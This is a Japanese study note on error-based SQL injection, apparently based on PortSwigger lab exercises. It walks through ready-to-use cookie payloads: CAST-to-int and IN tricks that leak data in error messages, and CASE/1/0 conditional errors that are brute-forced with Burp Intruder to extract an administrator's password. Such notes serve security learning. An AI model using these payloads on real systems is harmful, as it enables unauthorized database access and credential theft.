# 詳細なエラーによる情報の抽出

## 使用する場面

- DBの設定ミスで==詳細なエラーが表示される時==の攻撃
- ==文字数制限==で[4-2. Error-based SQLi](4-2.%20Error-based%20SQLi.md#条件により異なるエラーメッセージのトリガー)が不可能なときにも便利

### 補足：使用に適したレスポンスの特徴

- 例えばidパラメータにシングルクオテーションを追加
![[Pasted image 20231109164656.png]]
- 攻撃者が入力した値を使用してアプリが作成したクエリ全体を示している。
- 攻撃者が入力した値がどこの注入されているかがわかる。
- 攻撃の方法に目星がつく
	- WHERE句のidに注入されているので、注入したクエリのあとに`--`など追加してコメントアウトしようかな...など。

- たまに、クエリの結果の一部をエラーメッセージに含むアプリケーションもある。これはBlind SQLiを可視化できるということ。

## 方法概要

### INの使用

- IN演算子を使用し、エラーをトリガーする。エラー文に入手したい情報が記載されている
```mysql
' OR 1=1 IN (SELECT @@version) -- //
```

### CASTの使用

- 参照：[SQLi Cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)の「Extracting data via visible error messages」
	- 'secret'のとこに抽出したいカラム、FROM句、WHERE句などを入力する。
	- CASTはWHERE句でSELECT句不要([Microsoft Learn SQL](https://learn.microsoft.com/ja-jp/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16#a-use-both-cast-and-convert))

#### 補足：CAST()の挙動

- CAST関数により、あるデータ型を別のデータ型に変換できる。
- これによりエラーメッセージに結果の一部を表示することが可能。
- ↓例
```Postgresql
CAST((SELECT example_column FROM example_table) AS int)
```
- 抽出したいデータが文字列型だとする
- これをint型などの互換性のないデータ型に変換しようとする
- ↓以下のようなエラーが発生する
- `ERROR: invalid input syntax for type integer: "[Example data]"`

#### 詳細なエラーによる情報の抽出具体例 w/ CAST

1. シングルクオートの注入で反応を見る
```HTTP
TrackingId=ogAZZfxtOKUELbuJ'
```
- `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'LtZOL5t8JvpKfiFF''. Expected  char`
- -> F'のあとに注入されること＋クエリの全貌がわかる。

2. コメントアウトでエラーが出なくなることを確認する
```http
TrackingId=ogAZZfxtOKUELbuJ'--
```

3. (本ケースではPostgreSQLと仮定して)SELECT句で取得した値をCASTでintに変換してみる
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```
- [1. SQLi基本と対策](../1.%20SQLi基本と対策.md#ヘルスチェック)
- NULLでなく1を選択したのは、intに変換した結果、常に真であることを担保するため

4. エラーを確認する
```
ERROR: argument of AND must be type boolean, not type integer
```

5. 条件を変更する。boolean型に変更するには1=とするだけでいい。
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```
- エラーが出ないことを確認。正常なクエリと認識
- 🚨次のように、存在しないバリュー(hoge!)を指定した場合、サブクエリの中身はNULLとして返され、1=NULLで比較結果はNULLとなり、これもエラーにならない：`AND 1=CAST((SELECT password FROM users WHERE username='hoge!'))`

6. データが抽出できるか確かめる
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```
- `Unterminated s~(略) SELECT * FROM tracking WHERE id = 'e1qdpaUgrDy72U63' AND 1=CAST((SELECT username FROM users) AS'. Expected  char`
- ==文字数制限==→文字を削除して制限を回避する

7. 元の値(TrackingID)を消し、文字数制限を回避
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```
- `ERROR: more than one row returned by a subquery used as an expression`
- ->正常にクエリが実行されたが、返ってくる結果が1行以上なのでエラー

8. LIMITを使用して返ってくる結果を1行に絞る
```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- ＊: WHERE句は文字数制限の都合上、使用できない。
- 結果にadministratorが帰ってくるので、1行目にはadministratorのレコードがあることがわかる

9. 1行目にあるadministratorのレコードpasswordの抽出
```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

# 条件により異なるエラーメッセージのトリガー

## 使用する場面

- [4-1. Boolean-based SQLi](4-1.%20Boolean-based%20SQLi.md)と異なり、異なるBoolean条件を注入してもアプリケーションのレスポンスに違いがない場合
- SQLエラーが発生したかどうかによってアプリケーションに異なる振る舞いをさせることが可能な場合

## 方法概要

- CASE演算子を使用する
- [SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)の「Conditional errors」のペイロードをRDBの種類に合わせて使用し、条件が真のときにエラーがトリガーされるようにする

### パスワード抽出メソドロジー

前提：
- RDBMS: Oracle
- テーブル：users
- カラム：username, password
- 目的：usernameがadministratorのパスワードを抽出

#### ①パスワードの長さを測る

1. 条件が真（TRUE）なら「エラーを出す」、条件が偽（FALSE）なら 'a' = 'a' でTRUEとなり、正常応答になるクエリを挿入
```sql
xyz' AND (SELECT CASE WHEN (LENGTH(password) > 1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'--;
```

2. `LENGTH(password) < 50`などとし、ザックリとした幅を決める。

3.  Intruderで`LENGTH(password) > $1$`とし、Numbers payloadで1 to 50で総当たり。Statusが500と200の境界値をみる

#### ②パスワードを割り出す

- [4-1. Boolean-based SQLi](4-1.%20Boolean-based%20SQLi.md#2.%20Cluster%20bombでパスワードを割り出す)とやり方は基本的に同じ。

1. 基本的なクエリを作成
```sql
xyz' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) ='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```
- `LENGTH(password) > 1` が真の場合 `TO_CHAR(1/0)` を実行し、偽の場合 `'a'` を返す
- `1/0`： ゼロ除算エラーを意図的に発生させる
	- つまり、条件が正のとき、エラーを返すようにしている
- `TO_CHAR()` ： 数値を文字列に変換する関数で、構文チェックを通過させるための型合わせ(oracleでは`CASE WHEN (条件) THEN 1/0 ELSE 'a' END`とすると型が一致しない)

2. IntruderのCluster bombで総当たりする
```sql
xyz' AND (SELECT CASE WHEN (SUBSTR(password, §1§, 1) ='§a§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
```

## パスワード抽出実践例

- 前提：トラッキングクッキーを使うアプリケーションで、リクエストは次のようなクッキーヘッダを含むとする
```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7xyz
```

1. 挙動を確かめるために2つの異なるcookieの値を含むリクエストを送る。
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
- これらの入力は CASE キーワードを使用して条件をテストし、その式が真かどうかによって異なる式を返す
	- 最初の入力では、CASE式はELSEの'a'と評価され、='aとなり、エラーは発生しない
	- 2番目の入力では、THENの1/0と評価され、ゼロ除算エラーが発生する
		- →エラーが発生したら、指定した条件が正しいということ

- もしエラーの方がアプリケーションのHTTPレスポンスに違いをもたらすなら、注入された条件が真かどうかを判断するためにこれを使うことができる。

2. 一度に一文字ずつテストしてデータを取り出すことができる。
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'--
```
